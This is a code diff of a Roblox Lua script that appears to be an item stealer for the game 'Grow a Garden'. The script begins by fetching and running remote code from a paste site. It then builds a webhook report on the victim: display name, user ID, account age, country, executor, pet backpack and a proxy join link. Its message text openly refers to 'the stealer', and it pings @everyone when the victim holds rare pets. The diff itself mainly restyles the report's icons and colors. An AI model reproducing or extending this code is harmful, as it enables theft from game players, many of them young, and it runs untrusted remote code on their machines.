@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
+
+
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -505,71 +507,69 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         end
 
         local payload = {
-            username = "Scripts.SM",
-    avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
                 title = "Grow a Garden Hit - Scripts.SM",
                 url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 15105570,
+                color = 57855,
                 fields = {
                     {
-                        name = "<:stats:1365955343221264564> Display Name",
+                        name = "🪪 Display Name",
                         value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:players:1365290081937526834> Username",
+                        name = "👤 Username",
                         value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:reset:1364189779435978804> User ID",
+                        name = "🆔 User ID",
                         value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
                         inline = true
                     },
                     {
-                        name = "<:time:1365991843011100713> Account Age",
+                        name = "📅 Account Age",
                         value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
                         inline = true
                     },
                     {
-                        name = "<:players:1365290081937526834> Receiver",
+                        name = "💎 Receiver",
                         value = "```" .. (Username or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:changes:1365295949811028068> Account Created",
+                        name = "🎂 Account Created",
                         value = "```" .. (creationDateString or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:stats:1364189776885973072> Executor",
+                        name = "💻 Executor",
                         value = "```" .. (detectExecutor() or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:location:1365290076279541791> Country",
+                        name = "🌍 Country",
                         value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "<:players:1365290081937526834> Player Count",
+                        name = "📡 Player Count",
                         value = "```" .. (playerCount or 0) .. "/5```",
                         inline = true
                     },
                     {
-                        name = "<:money:1365955380294844509> Backpack",
+                        name = "💰 Backpack",
                         value = "```" .. truncateByLines(petString, 20) .. "```",
                         inline = false
                     },
                     {
-                        name = "<:folder:1365290079081205844> Join Script",
+                        name = "🚀 Join Script",
                         value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
                         inline = false
                     },
                     {
-                        name = "<:game:1365295942504550410> Join with URL",
+                        name = "🔗 Join with URL",
                         value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                         inline = false
                     }
